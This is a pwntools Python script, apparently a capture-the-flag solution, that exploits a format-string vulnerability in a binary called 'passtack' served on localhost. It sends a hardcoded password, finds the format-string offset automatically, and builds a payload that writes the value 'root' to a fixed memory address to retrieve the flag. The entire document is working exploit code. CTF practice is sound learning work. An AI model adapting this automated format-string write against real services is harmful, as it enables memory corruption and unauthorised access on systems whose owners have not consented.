from pwn import *
context.log_level = "critical"
context.binary = ELF('./passtack')
p = remote('localhost',9998 )
#p = process("./passtack")
p.sendline(b'G0oD_b0Y_15_th3_p455w0rd')
p.recvuntil(b'remarks?')	

def exec_fmt(payload):    
    p = remote('localhost',9998)
    #p = process("./passtack")
    p.sendline(b'G0oD_b0Y_15_th3_p455w0rd')
    p.recvuntil(b'remarks?')
    p.sendline(payload)
    # p.recvline()
    p.recvline()
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset #offset=16 (where our input is dropped)
payload = fmtstr_payload(offset, {0x404060 : 0x726f6f74})
print(payload)
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
flag = p.recvall()

print("Flag: ", flag)
